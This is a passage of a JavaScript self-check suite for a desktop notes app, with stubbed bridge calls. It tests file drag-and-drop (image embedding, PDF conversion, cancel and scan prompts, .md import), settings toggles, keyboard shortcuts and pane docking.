        const deco = app.querySelector('#note-body-editor [data-embed-for="attachments/sketch.png"]'), ix = deco && deco.previousElementSibling?.textContent === bs1 ? 2 : -1;   // drawn right after the block under the pointer (the page is redrawn, so by its text)
        syncDoc(n); if (!n.md.includes('![[attachments/sketch.png]]')) bad('the dropped image is in the note\'s Markdown', n.md.slice(0, 80));
        O.drop.imageIn = `embed at line ${ix} · Undo "${HOLD.cur?.msg}" · overlay gone ${!app.querySelector('.do-drop')}`;
        if (ix !== 2 || !HOLD.cur || app.querySelector('.do-drop')) bad('a dropped image goes in at the line, with Undo', O.drop.imageIn);
        holdUndo(); await tick(); syncDoc(n); if (n.md.includes('sketch.png')) bad('Undo takes the dropped image out', n.md.slice(0, 80)); });   // Undo's save goes to the stand-in too
      O.drop.imageIn += ` · calls ${[...new Set(calls.map(c => c[0]))].join(', ')}`;
      if (!calls.some(c => c[0] === 'drop_import' && c[1][0] === 'C:/drop/sketch.png')) bad('a dropped image is copied from its path', O.drop.imageIn);
      clearTimeout(n.saveT); n.md = md0; n.html = null; n.dirty = false; renderAll(); }
    // a PDF: the one question (parity round: the file, three choice rows, × on the title line, Add last, Always do this), on three screens
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) { set({ screen: sc, view: 'notes', modal: null }); fresh(); live();
      await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])) }, async () => {
        const r = app.querySelector('#note-body-editor > p').getBoundingClientRect(); drag(['Q3 audit report.pdf'], ['application/pdf'], r.left + 20, r.bottom - 2, 'drop'); for (let i = 0; i < 20 && S.modal !== 'do-ask'; i++) await tick(5); });
      const m = app.querySelector('.do-ask'), btns = [...(m?.querySelectorAll('.modal-foot .btn') || [])], foot = m?.querySelector('.modal-foot');
      const order = btns.map(b => b.textContent.trim()).join(' | '), mainLast = btns[btns.length - 1]?.classList.contains('btn--primary') && btns.filter(b => b.classList.contains('btn--primary')).length === 1;
      const over = foot ? [...foot.children].some(b => px(b).r > px(foot).r + .5) : true;
      const rowsQ = [...(m?.querySelectorAll('.dq-choice') || [])].map(b => b.querySelector('b').textContent).join(' | ');   // parity round: the file, three choice rows, Add
      O.drop[`ask ${sc}`] = `"${m?.querySelector('.modal-title')?.textContent}" · ${rowsQ} · ${order} · main last ${mainLast} · always ${!!m?.querySelector('#do-always')} · × ${!!m?.querySelector('.modal-head [data-act="dq-x"]')} · overflow ${over}`;
      if (m?.querySelector('.modal-title')?.textContent !== 'Add a file' || rowsQ !== 'Attach to this note | Convert into a new note | Attach to a new note' || order !== 'Add' || !mainLast || !m.querySelector('#do-always') || !m.querySelector('.modal-head [data-act="dq-x"]') || over) bad('the drop question (parity: choice rows)', `${sc}: ${O.drop[`ask ${sc}`]}`);
      fileNames('drop question ' + sc); app.querySelector('.do-ask [data-act="dq-x"]').click(); await tick(); if (S.modal || DROPO.ask) bad('× on the drop question adds nothing', sc); }
    // "Always do this" + Convert: the setting is saved; the pill counts pages, then the note, the result line and Attachments
    { set({ screen: '1920x1080', view: 'notes', modal: null }); fresh(); live(); let polls = 0, saved = null, pill = null;
      const calls = await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])), save_settings: p => { saved = p; return { status: 'success', ...p }; },
        convert_file: () => ({ status: 'success', job: 'j1' }), convert_job: () => (++polls < 3 ? { status: 'success', state: 'running', done: polls * 4, total: 12, label: `Page ${polls * 4} of 12` }
          : { status: 'success', state: 'done', done: 12, total: 12, result: { note_id: 77, title: 'Q3 audit report', created: true, warnings: [], pages: 12, scan: false, images: [{ file: 'attachments/q3-audit-report-img1.png', name: 'q3-audit-report-img1.png', size: 9000 }], tables: [{ file: 'attachments/Q3 audit report table 1.csv', name: 'Q3 audit report table 1.csv', size: 300, rows: 3, cols: 3 }] } }),
        get_note: () => ({ id: 77, title: 'Q3 audit report', content: '## Spend\n\n| Region | Spent |\n| --- | --- |\n| North | £112k |\n\n<!-- ![[attachments/Q3 audit report table 1.csv]] -->\n\n![[attachments/q3-audit-report-img1.png]]\n', tags: [], folder_id: null, project_id: rawId(D.projects[0].id), updated_at: '2026-10-17T10:00:00+00:00', created_at: '2026-10-17T10:00:00+00:00' }),
        list_attachments: () => ({ status: 'success', folder: 'C:/x/attachments', files: [{ ...att('attachments/q3-audit-report-img1.png', 9000), uses: [] }, { ...att('attachments/Q3 audit report table 1.csv', 300), uses: [] }] }) }, async () => {
        const r = app.querySelector('#note-body-editor > p').getBoundingClientRect(); drag(['Q3 audit report.pdf'], ['application/pdf'], r.left + 20, r.bottom - 2, 'drop'); for (let i = 0; i < 20 && S.modal !== 'do-ask'; i++) await tick(5);
        app.querySelector('.do-ask [data-act="dq-pick"][data-v="convert"]').click(); await tick(); app.querySelector('#do-always').checked = true; app.querySelector('.do-ask [data-act="dq-add"]').click();
        for (let i = 0; i < 80 && !pill; i++) { await tick(20); const p = app.querySelector('.do-pill'); if (p && /page/.test(p.textContent)) pill = p.textContent.replace(/\s+/g, ' ').trim() + ` · Cancel ${!!p.querySelector('[data-act="do-conv-cancel"]')}`; }
        for (let i = 0; i < 80 && DROPO.job; i++) await tick(20); await tick(20); });
      const res = app.querySelector('.do-result')?.textContent.replace(/\s+/g, ' ').trim(), rows = [...app.querySelectorAll('#right-sidebar .att-row.do-new')].map(b => b.title);
      O.drop.convert = `pill "${pill}" · saved ${JSON.stringify(saved)} · note "${note().title}" · tab ${S.tab} · result "${res}" · new rows ${rows.length} · table ${!!app.querySelector('#note-body-editor table')} · calls ${[...new Set(calls.map(c => c[0]))].join(', ')}`;
      if (!/page \d+ of 12/.test(pill || '') || !/Cancel true$/.test(pill || '') || saved?.drop_office_default !== 'convert' || DROPO.def !== 'convert' || note().title !== 'Q3 audit report' || S.tab !== 'files' || !/Converted from Q3 audit report\.pdf · 1 image and 1 table added to Attachments/.test(res || '') || rows.length !== 2)
        bad('Convert: the pill, then the note, the result line and the Attachments tab', O.drop.convert);
      fileNames('converted');
      D.notes = D.notes.filter(n => n.title !== 'Q3 audit report'); S.tab = 'outline'; D.atts = []; fresh(); }
    // Cancel on the pill: convert_cancel, and nothing is added; a scan asks to attach instead
    { set({ view: 'notes', modal: null }); fresh(); live(); DROPO.def = 'convert'; let cancelled = false, n0 = D.notes.length;
      const calls = await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])), convert_file: () => ({ status: 'success', job: 'j2' }), convert_cancel: () => { cancelled = true; return { status: 'success' }; },
        convert_job: () => cancelled ? { status: 'success', state: 'cancelled', done: 2, total: 12 } : { status: 'success', state: 'running', done: 2, total: 12 } }, async () => {
        const r = app.querySelector('#note-body-editor > p').getBoundingClientRect(); drag(['Big.pdf'], ['application/pdf'], r.left + 20, r.bottom - 2, 'drop');
        for (let i = 0; i < 80 && !app.querySelector('.do-pill [data-act="do-conv-cancel"]'); i++) await tick(10); app.querySelector('.do-pill [data-act="do-conv-cancel"]')?.click();
        for (let i = 0; i < 80 && DROPO.job; i++) await tick(20); });
      O.drop.cancel = `cancel sent ${cancelled} · notes +${D.notes.length - n0} · pill ${!!app.querySelector('.do-pill')} · "${S.status}"`;
      if (!cancelled || D.notes.length !== n0 || app.querySelector('.do-pill') || !/nothing was added/.test(S.status)) bad('Cancel stops converting and adds nothing', O.drop.cancel);
      fresh(); DROPO.def = 'convert';
      await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])), convert_file: () => ({ status: 'success', job: 'j3' }),
        convert_job: () => ({ status: 'success', state: 'done', done: 1, total: 1, result: { note_id: null, scan: true, warnings: ['This PDF is a scan: no text to convert.'], images: [], tables: [] } }) }, async () => {
        const r = app.querySelector('#note-body-editor > p').getBoundingClientRect(); drag(['scanned receipts.pdf'], ['application/pdf'], r.left + 20, r.bottom - 2, 'drop'); for (let i = 0; i < 80 && S.modal !== 'do-scan'; i++) await tick(10); });
      const m = app.querySelector('.do-scan'), btns = [...(m?.querySelectorAll('.modal-foot .btn') || [])].map(b => b.textContent.trim());
      O.drop.scan = `"${m?.querySelector('.modal-title')?.textContent}" · ${btns.join(' | ')}`;
      if (btns.join('|') !== 'Cancel|Attach it instead' || !m.querySelector('.modal-foot .btn:last-child').classList.contains('btn--primary')) bad('a scan: Cancel and Attach it instead', O.drop.scan);
      m?.querySelector('[data-act="do-scan-x"]')?.click(); if (S.modal) bad('Cancel on the scan question closes it', S.modal); fresh(); }
    // no note to drop into (a list is showing): the overlay says a new note
    { set({ view: 'notes', modal: null }); fresh(); live(); LD.list = 'inbox'; renderAll(); const v = app.querySelector('.ld-page').getBoundingClientRect();
      await withApi({}, async () => { drag(['sketch.png'], ['image/png'], v.left + 50, v.top + 150, 'dragover'); });
      O.drop.noNote = app.querySelector('.do-drop')?.textContent; if (!/attach it to a new note/.test(O.drop.noNote || '') || app.querySelector('.do-drop-line')) bad('dropping with no note open: a new note', O.drop.noNote); doEnd(); fresh(); renderAll(); }
  } finally { VAULT.live = liveWas; CAPTURE.live = capWas; fresh(); }

  // 4 · Settings → Vault & files: the four choices, Reset and Undo reset (a stand-in bridge: config.json isn't written)
  { set({ view: 'notes', modal: 'settings' }); S.setSec = 'vault'; renderAll(); let saved = [];
    await withApi({ save_settings: p => { saved.push(p.drop_office_default); return { status: 'success', ...p }; } }, async () => {
      const card = () => app.querySelector('#do-drop-card');
      card()?.querySelector('[data-act="do-def"][data-v="attach_new"]')?.click(); await tick(); card()?.querySelector('[data-act="do-reset"]')?.click(); await tick(); card()?.querySelector('[data-act="do-undo-reset"]')?.click(); await tick(); });
    const c = app.querySelector('#do-drop-card'), opts = [...(c?.querySelectorAll('[data-act="do-def"]') || [])].map(b => b.dataset.v).join(',');
    O.flows.settings = `${opts} · saved ${saved.join(' → ')} · now ${DROPO.def} · pressed ${c?.querySelector('[aria-pressed="true"]')?.dataset.v}`;
    if (opts !== 'ask,convert,attach,attach_new' || saved.join() !== 'attach_new,ask,attach_new' || DROPO.def !== 'attach_new' || c.querySelector('[aria-pressed="true"]').dataset.v !== 'attach_new') bad('Settings → When you drop a PDF or Word file', O.flows.settings);
    measure('buildO settings vault'); set({ modal: null }); S.setSec = 'appearance'; fresh(); }
  // QC 48: the Open file icon (wireframe, right of New sticky note since QC 55, its tooltip and Ctrl+O), Ctrl+O, Settings → Keyboard shortcuts; a dropped .md
  { const icon = {};
    for (const sc of ['1920x1080', '1366x768']) for (const [view, inspector] of [['notes', 'shown'], ['notes', 'hidden'], ['tasks', 'shown']]) {
      set({ screen: sc, view, inspector, modal: null }); const b = app.querySelector('.titlebar [data-act="md-open"]'), svg = b?.querySelector('svg'), next = b?.nextElementSibling?.dataset.act;
      icon[`${sc}/${view}/${inspector}`] = b ? `${half(px(b).w)}×${half(px(b).h)} · "${b.title}" · ${b.getAttribute('aria-keyshortcuts')} · then ${next}` : 'none';
      if (!b || !b.offsetWidth || next !== 'dump' || b.previousElementSibling?.dataset.act !== 'sticky-new' || svg?.getAttribute('fill') !== 'none' || !/Ctrl\+O$/.test(b.title) || b.getAttribute('aria-keyshortcuts') !== 'Control+O' || px(b).h !== px(b.nextElementSibling).h) bad('the Open file icon (QC 48)', `${sc}/${view}/${inspector}: ${icon[`${sc}/${view}/${inspector}`]}`); }
    O.flows.openIcon = icon;
    S.setSec = 'hotkeys'; set({ screen: '1920x1080', view: 'notes', inspector: 'shown', modal: 'settings' }); const listed = [...app.querySelectorAll('.settings-pane .set-row')].find(r => /Open a file as a note/.test(r.textContent))?.textContent.replace(/\s+/g, ' ');
    if (!/Ctrl ?O/.test(listed || '')) bad('Settings → Keyboard shortcuts lists Ctrl+O', listed); set({ modal: null }); S.setSec = 'appearance';
    const liveWas = VAULT.live; let opened = null, placeArgs0 = null, want = null;
    try {
      const calls = await withApi({ browse_open_files: () => ['C:/notes/STAR stories.md'], import_md_files: (paths, f, p) => { placeArgs0 = [paths, f, p]; return { status: 'success', notes: [{ id: 91, title: 'STAR stories', file: 'STAR stories.md', images: [] }], errors: [] }; },
        get_note: () => ({ id: 91, title: 'STAR stories', content: '# STAR stories\n\nSituation, task, action, result.\n', tags: [], folder_id: null, project_id: rawId(D.projects[0].id), updated_at: '2026-10-18T09:00:00+00:00', created_at: '2026-10-18T09:00:00+00:00' }) }, async () => {
        VAULT.live = true; app.querySelector('#note-body-editor')?.focus(); const t = targetFolder(); want = isProj(t) ? [null, rawId(t)] : [rawId(t), null];
        document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: 'o', code: 'KeyO', ctrlKey: true, bubbles: true, cancelable: true }));
        for (let i = 0; i < 40 && note().title !== 'STAR stories'; i++) await tick(10); opened = note().title; });
      O.flows.ctrlO = `calls ${[...new Set(calls.map(c => c[0]))].join(', ')} · placed ${JSON.stringify(placeArgs0)} · opened "${opened}" · in tree ${!!app.querySelector('[data-tree="note"][data-v="n-91"]')} · "${S.status}"`;
      if (!calls.some(c => c[0] === 'browse_open_files') || JSON.stringify(placeArgs0?.slice(1)) !== JSON.stringify(want) || opened !== 'STAR stories' || !/Opened “STAR stories\.md” as a note/.test(S.status)) bad('Ctrl+O opens a .md as a note (QC 48)', O.flows.ctrlO);
      // a dropped .md: a note, then "Attach instead" takes that untouched note back out and attaches the file where it was dropped
      set({ view: 'notes', sample: 'typical', modal: null }); fresh(); VAULT.live = true; CAPTURE.live = true; const n0 = note(), count0 = D.notes.length;
      const calls2 = await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])), import_md_files: () => ({ status: 'success', notes: [{ id: 92, title: 'Week plan', file: 'Week plan.md', images: [] }], errors: [] }),
        get_note: () => ({ id: 92, title: 'Week plan', content: 'Monday: mock interview.\n', tags: [], folder_id: null, project_id: rawId(D.projects[0].id), updated_at: '2026-10-18T09:00:00+00:00', created_at: '2026-10-18T09:00:00+00:00' }),
        drop_import: p => att('attachments/' + p.split('/').pop()) }, async () => {
        const r = app.querySelector('#note-body-editor > p').getBoundingClientRect(); drag(['Week plan.md'], ['text/markdown'], r.left + 20, r.bottom - 2, 'dragover');
        O.flows.mdOverlay = app.querySelector('.do-drop')?.textContent;
        drag(['Week plan.md'], ['text/markdown'], r.left + 20, r.bottom - 2, 'drop'); for (let i = 0; i < 40 && !app.querySelector('.do-mdbar'); i++) await tick(10);
        O.flows.mdBar = `${app.querySelector('.do-mdbar')?.textContent.trim()} · note "${note().title}" · notes +${D.notes.length - count0}`;
        app.querySelector('.do-mdbar [data-act="md-attach-instead"]')?.click(); for (let i = 0; i < 60 && !(note()?.id === n0.id && (syncDoc(n0), n0.md.includes('Week plan.md'))); i++) await tick(10);
        if (HOLD.cur) await holdCommit(); });
      const names = calls2.map(c => c[0]);
      O.flows.mdDrop = `${O.flows.mdBar} · after Attach instead: note "${note().title}", embedded ${n0.md.includes('![[attachments/Week plan.md]]')}, notes ${D.notes.length - count0}, calls ${[...new Set(names)].join(', ')}`;
      if (!/Drop to open it as a note/.test(O.flows.mdOverlay || '') || !/Opened “Week plan\.md” as a note\s*Attach instead/.test(O.flows.mdBar) || note().id !== n0.id || !n0.md.includes('![[attachments/Week plan.md]]') || D.notes.length !== count0 || !names.includes('delete_note'))
        bad('a dropped .md opens as a note, with Attach instead (QC 48)', `${O.flows.mdDrop} · overlay "${O.flows.mdOverlay}"`);
      clearTimeout(n0.saveT); n0.dirty = false;
    } finally { VAULT.live = liveWas; CAPTURE.live = false; MDO.bar = null; fresh(); }
    set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); }
  // Ctrl+K: the command's new name
  { openPalette(); S.pal.q = '>convert'; renderAll(); const l = [...app.querySelectorAll('.pal-item')].map(x => x.textContent.trim()).join(' | '); closeModal();
    O.flows.palette = l; if (!/Convert PDF or Word to Markdown/.test(l) || /Convert PDF to Markdown/.test(l)) bad('Ctrl+K: Convert PDF or Word to Markdown', l); }
  set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); fresh(); CAPTURE.live = cap0;
}
/* ==== end Build O ==== */
/* ==== Build M (QC 4 · 31): a shortcut for every rail and window-bar button (shortcuts.js). The table has no two keys alike and none
   the editor, the app, WebView2 or Windows already use; every rail and window-bar button's tooltip ends "· its key" (with
   aria-keyshortcuts) and no two buttons share one, in each view, with the timer running, in zen, maximised, the right sidebar shown or
   hidden and the tabs overflowing, at 1366 × 768 and 3440 × 1440; each key runs its button (the mic, the window and new sticky notes
   stubbed: nothing is recorded or made), and waits while a dialog is open; in a text field a press that types a character (AltGr)
   types it; Settings → Keyboard shortcuts lists every key in its group. The bridge is stubbed: nothing reaches the database or
   config.json. Runs in the full sweep, or alone with ?check=1&only=keys ==== */
async function checkKeys() {
  const K = out.numbers.keys = { table: {}, tips: {}, runs: {}, wait: {}, typing: {}, settings: {} }, bad = (k, v) => iss('Build M keys: ' + k, v);
  const was = window.pywebview; window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : () => Promise.resolve({ status: 'success' }) }) };
  const stubs = { openVoice, newSticky, winAction }, calls = [];
  openVoice = () => calls.push('voice'); newSticky = () => calls.push('sticky'); winAction = v => calls.push('win ' + v);   // eslint-disable-line no-global-assign
  const press = (sig, o = {}) => { const k = sig.split('+'), key = k[k.length - 1], code = /^\d$/.test(key) ? 'Digit' + key : /^[a-z]$/.test(key) ? 'Key' + key.toUpperCase() : { ',': 'Comma', enter: 'Enter' }[key] || key;
    const e = new KeyboardEvent('keydown', { key: o.key || (key === 'enter' ? 'Enter' : key), code, ctrlKey: k.includes('ctrl'), altKey: k.includes('alt'), shiftKey: k.includes('shift'), repeat: !!o.repeat, bubbles: true, cancelable: true });
    (o.at || document.activeElement || document.body).dispatchEvent(e); return e; };
  try {
    // 1 · the table: no two keys alike; the new ones take no key the editor, the app, WebView2 or Windows use
    const RESERVED = ['ctrl+b', 'ctrl+i', 'ctrl+u', 'ctrl+k', 'ctrl+z', 'ctrl+y', 'ctrl+shift+z', 'ctrl+a', 'tab', 'shift+tab', 'f2', 'f7', 'f11', 'ctrl+n', 'ctrl+s', 'ctrl+t', 'ctrl+w',
      'ctrl+shift+d', 'ctrl+alt+r', 'ctrl+alt+p', 'ctrl+alt+s', 'ctrl+alt+h', 'ctrl+f', 'ctrl+g', 'ctrl+p', 'ctrl+r', 'f5', 'f12', 'ctrl+shift+i', 'ctrl+shift+j', 'ctrl+shift+c', 'ctrl+tab',
      'ctrl+shift+tab', 'alt+f4', 'alt+tab', 'ctrl+alt+delete', 'ctrl+alt+arrowup', 'ctrl+alt+arrowdown', 'ctrl+alt+arrowleft', 'ctrl+alt+arrowright', 'ctrl+alt+a', 'ctrl+alt+e', 'ctrl+alt+i', 'ctrl+alt+o', 'ctrl+alt+u'];
    const sigs = KEYS.flatMap(x => [keySig(x.k), ...(x.or ? [keySig(x.or)] : [])]), dup = sigs.filter((s, i) => sigs.indexOf(s) !== i), mine = KEYS.filter(x => x.run).map(x => keySig(x.k));
    K.table = { keys: KEYS.length, run: mine.length, dup: dup.join(' ') || 'none', clash: mine.filter(s => RESERVED.includes(s)).join(' ') || 'none' };
    if (dup.length) bad('two entries share a key', K.table.dup);
    if (K.table.clash !== 'none') bad('a new key clashes with the editor, the app, WebView2 or Windows', K.table.clash);
    if (KEYS.some(x => x.run && !x.sel)) bad('a key that runs has no button', KEYS.filter(x => x.run && !x.sel).map(x => x.l).join(', '));

    // 2 · the tooltips: every rail and window-bar button ends "· its key", with aria-keyshortcuts, and no two buttons share one
    const states = [['notes', {}], ['notes, right sidebar hidden', { inspector: 'hidden' }], ['tasks', { view: 'tasks' }], ['timer running', { view: 'timer', tstate: 'running' }], ['timeline', { view: 'history' }],
      ['dictionary', { view: 'dict' }], ['zen', { zen: 'on' }], ['maximised', { max: true }], ['tabs overflow', { sample: 'stress' }], ['left sidebar hidden', { side: false }]];
    for (const sc of ['1366x768', '3440x1440']) for (const [name, o] of states) {
      S.max = !!o.max; set({ screen: sc, sample: o.sample || 'typical', view: o.view || 'notes', tstate: o.tstate || 'idle', zen: o.zen || 'off', inspector: o.inspector || 'shown', side: o.side ?? true, modal: null, widgets: 'none' });
      const key = `${sc}/${name}`, btns = [...app.querySelectorAll('.rail button, .titlebar button')].filter(b => b.getClientRects().length && !(b.matches('.ws-tab-close') && b.closest('.ws-tab')?.getAttribute('aria-selected') !== 'true'));
      const noKey = btns.filter(b => !/ · (Ctrl|Alt|Shift|F\d+)\S*( or \S+)?$/.test(b.title) || !b.getAttribute('aria-keyshortcuts')).map(b => (b.dataset.act || '') + ':' + (b.dataset.v || '') + ' "' + b.title + '"');
      const by = {}; btns.forEach(b => { const a = b.getAttribute('aria-keyshortcuts'), id = (b.dataset.act || '') + ':' + (b.dataset.act === 'tab-close' ? '' : b.dataset.v || ''); if (a) (by[a] ||= new Set()).add(id); });
      const shared = Object.entries(by).filter(([, s]) => s.size > 1).map(([a, s]) => `${a}: ${[...s].join(' & ')}`);
      const tipKey = btns.filter(b => b.getAttribute('aria-keyshortcuts') && !b.title.endsWith(' · ' + (KEYS.find(x => x.sel && b.matches(x.sel))?.tip || b.getAttribute('aria-keyshortcuts').replace(/Control/g, 'Ctrl').replace(/Escape/, 'Esc'))));
      K.tips[key] = `${btns.length} buttons`; if (noKey.length) bad('a rail or window-bar button without its key in the tooltip', `${key}: ${noKey.slice(0, 4).join(', ')}`);
      if (shared.length) bad('two buttons share a key', `${key}: ${shared.join('; ')}`);
      if (tipKey.length) bad('the tooltip and aria-keyshortcuts disagree', `${key}: ${tipKey.map(b => b.title).slice(0, 3).join(', ')}`);
      if (name === 'notes' && sc === '1366x768') { const tm = app.querySelector('.rail [data-v="timer"]'); K.tips.timer = tm.title; if (!/^Timer( · .+)? · Ctrl\+Alt\+3$/.test(tm.title) || tm.getAttribute('aria-keyshortcuts') !== 'Control+Alt+3') bad('Timer\'s tooltip', tm.title); }
      if (name === 'tabs overflow' && sc === '1366x768' && !app.querySelector('[data-act="tab-list"]')?.offsetWidth) bad('the stress sample shows the tab list button', key);
    }
    S.max = false;

    // 3 · each key runs its button, from the page and from inside a note
    set({ screen: '1366x768', sample: 'typical', view: 'notes', tstate: 'idle', zen: 'off', inspector: 'shown', side: true, modal: null, widgets: 'none' }); document.body.focus?.();
    const run = (sig, at) => { const e = press(sig, { at }); return e.defaultPrevented; }, R = K.runs;
    for (const [d, v] of [['2', 'tasks'], ['3', 'timer'], ['4', 'history'], ['5', 'dict'], ['1', 'notes']]) { run('ctrl+alt+' + d, document.body); R[d] = UI.view; if (UI.view !== v) bad('Ctrl+Alt+' + d + ' opens ' + v, UI.view); }
    const doc = app.querySelector('.doc'); doc.focus(); const html = doc.innerHTML;
    run('ctrl+alt+3', doc); R.fromNote = UI.view; if (UI.view !== 'timer') bad('Ctrl+Alt+3 works from inside a note', UI.view);
    run('ctrl+alt+1', document.body); if (app.querySelector('.doc').innerHTML !== html) bad('a shortcut from inside a note changes its text', '');
    run('ctrl+,', document.body); R.settings = S.modal; if (S.modal !== 'settings') bad('Ctrl+, opens Settings', S.modal); closeModal(true); renderAll();
    run('ctrl+alt+b'); R.side = S.side; run('ctrl+alt+b'); if (R.side !== false || S.side !== true) bad('Ctrl+Alt+B hides and shows the left sidebar', `${R.side} ${S.side}`);
    run('ctrl+alt+n'); R.insp = UI.inspector; run('ctrl+alt+n'); if (R.insp !== 'hidden' || UI.inspector !== 'shown') bad('Ctrl+Alt+N hides and shows the right sidebar', `${R.insp} ${UI.inspector}`);
    setUI('view', 'tasks'); const ui0 = UI.inspector; run('ctrl+alt+n'); if (UI.inspector !== ui0) bad('Ctrl+Alt+N does nothing outside a note (no right sidebar)', UI.inspector); setUI('view', 'notes');
    app.querySelector('.ws-tab[aria-selected="true"]').focus(); run('ctrl+alt+l'); R.list = `${S.tabList} ${document.activeElement?.getAttribute('role')}`; run('ctrl+alt+l');
    R.listBack = document.activeElement?.className; if (!R.list.startsWith('true menuitem') || S.tabList || !document.activeElement?.matches('.ws-tab[aria-selected="true"]')) bad('Ctrl+Alt+L opens and closes the tab list, back on the tab', `${R.list} → ${R.listBack}`);
    run('ctrl+alt+q'); R.qt = qtOpen(); run('ctrl+alt+q'); if (!R.qt || qtOpen()) bad('Ctrl+Alt+Q opens and closes the quick timer', `${R.qt} ${qtOpen()}`);
    run('ctrl+alt+w'); R.wrap = S.modal; if (!wrapOpen()) bad('Ctrl+Alt+W opens the wrap-up', S.modal); closeModal(true); renderAll();
    const th = READER.theme; run('ctrl+alt+t'); R.theme = READER.theme; run('ctrl+alt+t'); if (R.theme === th || READER.theme !== th) bad('Ctrl+Alt+T switches the theme and back', `${th} → ${R.theme} → ${READER.theme}`);
    calls.length = 0; run('ctrl+alt+j'); run('ctrl+alt+v'); run('ctrl+alt+m'); run('ctrl+alt+enter'); await wait(0); R.stubbed = calls.join(', ');
    if (R.stubbed !== 'sticky, voice, win min, win max') bad('Ctrl+Alt+J, V, M and Enter run New sticky note, Voice ramble, Minimise and Maximise', R.stubbed);
    if (S.modal) { closeModal(true); renderAll(); }
    const rep = press('ctrl+alt+2', { repeat: true, at: document.body }); if (UI.view !== 'notes' || !rep.defaultPrevented) bad('a held key runs once (repeats are swallowed)', UI.view);

    // 4 · they wait while a dialog is open
    for (const m of ['settings', 'palette', 'dump']) { if (m === 'palette') openPalette(); else if (m === 'dump') openDump(); else openSettings(); renderAll();
      const e = press('ctrl+alt+2', { at: document.activeElement }); K.wait[m] = `${UI.view} ${S.modal}`; if (UI.view !== 'notes' || S.modal !== m || e.defaultPrevented) bad('a shortcut runs while a dialog is open', `${m}: ${K.wait[m]}`); closeModal(true); renderAll(); }

    // 5 · AltGr: in a text field a press that types a character is left to type it; elsewhere it runs
    const d2 = app.querySelector('.doc'); d2.focus(); let e = press('ctrl+alt+2', { key: '@', at: d2 }); K.typing.note = `${UI.view} ${e.defaultPrevented}`;
    if (UI.view !== 'notes' || e.defaultPrevented) bad('Ctrl+Alt+2 typing @ (AltGr) in a note goes to Tasks', K.typing.note);
    setUI('view', 'tasks'); const q = app.querySelector('[data-bm-q]'); q.focus(); e = press('ctrl+alt+4', { key: '€', at: q }); K.typing.search = `${UI.view} ${e.defaultPrevented}`;
    if (UI.view !== 'tasks' || e.defaultPrevented) bad('Ctrl+Alt+4 typing € (AltGr) in a search box goes to the Timeline', K.typing.search);
    e = press('ctrl+alt+3', { at: q }); K.typing.plain = UI.view; if (UI.view !== 'timer') bad('Ctrl+Alt+3 with no character to type works from a search box', UI.view);
    e = press('ctrl+alt+2', { key: '@', at: document.body }); K.typing.page = UI.view; if (UI.view !== 'tasks') bad('Ctrl+Alt+2 (AltGr @) outside a text field goes to Tasks', UI.view);
    setUI('view', 'notes');

    // 6 · Settings → Keyboard shortcuts: every key, in its group
    S.setSec = 'hotkeys'; set({ modal: 'settings' });
    const groups = [...app.querySelectorAll('.settings-pane .km-sec')].map(s => [s.querySelector('.eyebrow').textContent, s.querySelectorAll('.set-row').length]);
    K.settings = groups.map(g => g.join(' ')).join(', ');
    if (groups.map(g => g[0]).join() !== KEY_GROUPS.map(g => g[1]).join() || groups.reduce((n, g) => n + g[1], 0) !== KEYS.length) bad('Settings lists every key in its group', K.settings);
    const tmRow = [...app.querySelectorAll('.settings-pane .km-sec .set-row')].find(r => r.querySelector('.set-label').textContent === 'Timer'), tmKeys = [...(tmRow?.querySelectorAll('.kbd') || [])].map(k => k.textContent).join('+');
    K.settings += ` · Timer ${tmKeys}`; if (tmKeys !== 'Ctrl+Alt+3') bad('Settings shows Timer · Ctrl+Alt+3', tmKeys);
    S.modal = null; renderAll();
  } finally {
    ({ openVoice, newSticky, winAction } = stubs); window.pywebview = was; S.max = false; S.tabList = false;   // eslint-disable-line no-global-assign
  }
}
/* ==== end Build M keys ==== */
/* ==== Build M · R44 (locked) with R45's settings: tabs for notes only; modules dock beside a note by dragging their rail icon.
   Tabs never hold a module; a rail click opens one in the main area with a × (the note tabs stay); docking beside or below at each
   screen and each "How panes split", three panes at most and never under 360 × 240; nothing above the panes moves when the focus
   moves, in each focus look; one header and one × per pane; the rail's pressed and current looks; a real pointer drag (zones, Esc,
   refusals); the rail and ⋮ menus at their buttons; F6; Ctrl+K; the lines between panes; the note split (More → Split right, a tab
   dropped on an edge); Settings → Editor → Split screen; next launch as you left it. The bridge is stubbed: nothing is saved.
   Runs in the full sweep, or alone with ?check=1&only=panes ==== */
async function checkPanes() {
  const P = out.numbers.panes = { tabs: {}, dock: {}, still: {}, looks: {}, heads: {}, drag: {}, menus: {}, keys: {}, split: {}, settings: {}, restore: {} }, bad = (k, v) => iss('Build M R44: ' + k, v);
  const was = window.pywebview, saved = []; window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { if (n === 'save_settings') saved.push(a[0]); return Promise.resolve(n === 'get_settings' ? {} : { status: 'success' }); } }) };
  const keepSet = { ...PANE_SET }, rect = el => { if (!el) return null; const b = el.getBoundingClientRect(), z = pnZoom(); return [b.left, b.top, b.width, b.height].map(v => Math.round(v / z)).join(','); };
  const base = (o = {}) => { pnReset(); set({ screen: '1920x1080', sample: 'typical', view: 'notes', tstate: 'idle', zen: 'off', inspector: 'shown', side: true, modal: null, widgets: 'none', ...o }); S.offTab = null; S.menu = false; renderAll(); };
  const sizes = () => [...app.querySelectorAll('.panes > .pane-col > .pane')].map(p => { const b = p.getBoundingClientRect(), z = pnZoom(); return [Math.round(b.width / z), Math.round(b.height / z)]; });
  const look = s => { PANE_SET.focus = s; paneLook(); };
  try {
    // 1 · tabs for notes only: none at launch, none from the rail; a module in the main area has a × and the note tabs stay put
